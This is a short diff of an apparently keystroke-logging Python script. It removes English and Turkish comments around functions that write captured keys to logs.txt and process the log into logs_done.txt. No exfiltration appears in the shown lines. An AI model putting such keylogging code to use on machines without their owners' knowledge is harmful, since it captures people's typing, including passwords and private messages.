@@ -22,9 +22,6 @@ def write_file(keys):
 		for key in keys:
 			k = str(key).replace("'", "")
 			f.write(k)
-					
-			# explicitly adding a space after 
-			# every keystroke for readability
 			f.write(' ')
 			
 def on_release(key):			
@@ -59,10 +56,7 @@ def process_log(input_file_path, output_file_path):
 
 with open("logs_done.txt", "a") as f:
 	f.write("\n") 
-
-# Kullanım örneği
+	
 input_file_path = 'logs.txt'
 output_file_path = 'logs_done.txt'
-
-# Fonksiyonu çağırarak işleme yap
 process_log(input_file_path, output_file_path)
